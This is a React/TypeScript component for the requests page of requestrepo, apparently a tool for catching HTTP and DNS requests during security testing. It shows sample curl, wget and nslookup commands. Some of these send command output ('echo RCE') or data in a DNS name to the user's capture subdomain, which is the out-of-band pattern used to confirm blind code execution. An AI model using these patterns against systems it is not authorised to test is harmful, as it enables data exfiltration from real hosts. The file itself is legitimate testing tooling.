import React, { useEffect, useState } from "react";
import { RequestInfo } from "./request-info";
import { EditorComponent } from "./editor";
import { Button } from "primereact/button";
import { toast } from "react-toastify";
import { Utils } from "../utils";
import { AppSession, Request, ToastFunctions } from "../types/app-types";

interface RequestsPageProps {
  user: AppSession | null;
  sharedRequest?: Request | null;
  toast?: ToastFunctions;
  activeSession?: string;
}

export function RequestsPage({
  user,
  sharedRequest,
}: RequestsPageProps): React.ReactElement {
  const [isEditorFocused, setIsEditorFocused] = useState<boolean>(false);
  const [selectedRequest, setSelectedRequest] = useState<Request | null>(null);

  useEffect(() => {
    if (!user) {
      setSelectedRequest(null);
      return;
    }

    if (sharedRequest) {
      setSelectedRequest(sharedRequest);
      return;
    }

    if (
      user.selectedRequest &&
      user.requests &&
      user.requests[user.selectedRequest]
    ) {
      setSelectedRequest(user.requests[user.selectedRequest]);
      return;
    }

    if (user.requests && Object.keys(user.requests).length > 0) {
      const requestIds = Object.keys(user.requests);
      setSelectedRequest(user.requests[requestIds[0]]);
      return;
    }

    setSelectedRequest(null);
  }, [
    sharedRequest,
    user,
    user?.selectedRequest,
    user?.requests ? Object.keys(user.requests).length : 0,
  ]);

  const handleEditorFocus = (): void => {
    setIsEditorFocused(true);
  };

  const handleEditorBlur = (): void => {
    setIsEditorFocused(false);
  };

  if (!user) {
    return (
      <div className="card card-w-title card-body">
        <h1>No Session Available</h1>
        <p>Please create or select a session to continue.</p>
      </div>
    );
  }

  const activeSession = Utils.getActiveSession();

  const token =
    isEditorFocused && activeSession ? activeSession.token : "********";

  let url;
  try {
    url = new URL("http://" + (user?.domain || window.location.hostname) + "/");
  } catch {
    url = new URL("http://" + window.location.hostname + "/");
  }
  let port = url.port;
  if (!port) port = window.location.protocol === "https:" ? "443" : "80";

  const content = `from requestrepo import Requestrepo # pip install requestrepo
client = Requestrepo(token="${token}", host="${url.hostname}", port=${port}, protocol="${port === "443" ? "https" : "http"}")

print(client.subdomain) # ${user.subdomain}
print(client.domain) # ${user.subdomain}.${user.domain}

client.update_http(raw=b"hello world")

# Get the latest request (blocks until one is received)
new_request = client.get_request()
print("Latest Request:", new_request)`;

  return (
    <div className="card card-w-title card-body">
      {(!selectedRequest ||
        (Object.keys(user?.requests || {}).length === 0 && !sharedRequest)) && (
        <div className="grid">
          <div className="col-12">
            <h1>Awaiting requests</h1>
            <p>How to make a request:</p>
            <code>
              curl http://
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              curl http://{user.domain}/r/
              {user?.subdomain || "default"}/
            </code>
            <br />
            <br />
            <code>
              curl -X POST --data hello http://
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              nslookup your.data.here.
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              echo RCE | curl -d @-{" "}
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <code>
              wget --post-data &quot;$(echo RCE)&quot; -O-{" "}
              {user?.url || `${user?.subdomain}.${user?.domain}`}
            </code>
            <br />
            <br />
            <p>
              Check out the Response tab to edit your HTTP Response or the DNS
              tab to add DNS records for this subdomain.
            </p>
            <p>
              Automate requests/responses using the{" "}
              <a
                href="https://github.com/adrgs/requestrepo-lib"
                target="_blank"
                rel="noreferrer"
              >
                requestrepo
              </a>{" "}
              Python library:
            </p>
            <CopyButton
              text={content.replace(
                "********",
                activeSession ? activeSession.token : "",
              )}
            />
            <EditorComponent
              value={content}
              onChange={() => {
                /* No changes needed */
              }}
              commands={[]}
              language={"python"}
              onFocus={handleEditorFocus}
              onBlur={handleEditorBlur}
            />
          </div>
        </div>
      )}
      {selectedRequest && (
        <RequestInfo
          request={selectedRequest}
          isShared={selectedRequest === sharedRequest}
        />
      )}
    </div>
  );
}

interface CopyButtonProps {
  text: string;
}

export const CopyButton = ({ text }: CopyButtonProps): React.ReactElement => {
  const handleCopy = (): void => {
    navigator.clipboard
      .writeText(text)
      .then(() =>
        toast.info("Python code copied to clipboard!", Utils.toastOptions),
      )
      .catch(() =>
        toast.error(
          "Failed to copy Python code to clipboard!",
          Utils.toastOptions,
        ),
      );
  };

  return (
    <Button
      label="Copy"
      className="p-button-outlined p-button-secondary"
      style={{ padding: "0.5rem", marginBottom: "1rem" }}
      icon="pi pi-copy"
      onClick={handleCopy}
    />
  );
};
